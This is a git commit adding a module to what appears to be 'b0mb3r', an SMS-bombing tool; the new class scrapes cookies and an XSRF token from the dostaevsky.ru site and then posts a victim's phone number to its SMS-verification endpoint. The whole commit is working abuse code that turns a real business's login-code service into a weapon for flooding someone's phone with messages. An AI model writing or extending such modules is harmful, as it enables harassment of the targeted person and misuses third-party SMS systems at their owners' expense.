2a712913024640a39ad48612d97bff1c1548327b
asinedd <67601784+asinedd@users.noreply.github.com>
2020-06-29 22:48:43 +0500

    +1 сервис

---
+++ b0mb3r/services/dostaevsky.py
@@ -0,0 +1,15 @@
+from b0mb3r.services.service import Service
+
+
+class Dostaevsky(Service):
+    phone_codes = [7]
+
+    async def run(self):
+        response = await self.get("https://dostaevsky.ru/")
+        cookies = response.cookies
+
+        await self.post(
+            "https://dostaevsky.ru/auth/send-sms",
+            cookies=cookies,
+            data={"phone": self.format(self.formatted_phone, "* *** ***-**-**"), "_token": cookies["XSRF-TOKEN"]},
+        )
